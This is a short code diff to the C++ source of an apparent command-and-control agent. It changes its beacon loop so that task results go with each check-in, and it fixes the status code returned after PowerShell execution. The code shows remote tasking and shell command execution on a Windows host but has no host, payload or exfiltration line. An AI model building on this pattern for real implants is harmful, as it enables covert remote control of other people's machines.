@@ -42,11 +42,13 @@ void Agent::Start()
     {
         if (!taskManager.HasPendingResult())
         {
-            taskManager.QueueTask(commManager.Checkin());
+            auto request = commManager.Checkin(taskManager.GetTaskResults());
+            taskManager.QueueTask(request);
         }
         else
         {
-            std::string newTask = commManager.Checkin(taskManager.GetTaskResult());
+            std::string newTask = commManager.Checkin(taskManager.GetTaskResults());
+
             taskManager.QueueTask(newTask);
         }
 
@@ -71,7 +73,6 @@ void Agent::Start()
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Agent default commands 
-
 void Agent::Exit()
 {
     ExitProcess(0);
@@ -106,7 +107,7 @@ Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& ps
 
     _pclose(pipe);
 
-    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ result });
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, SUCCESS, TaskSuccess{ result });
 }
 
 
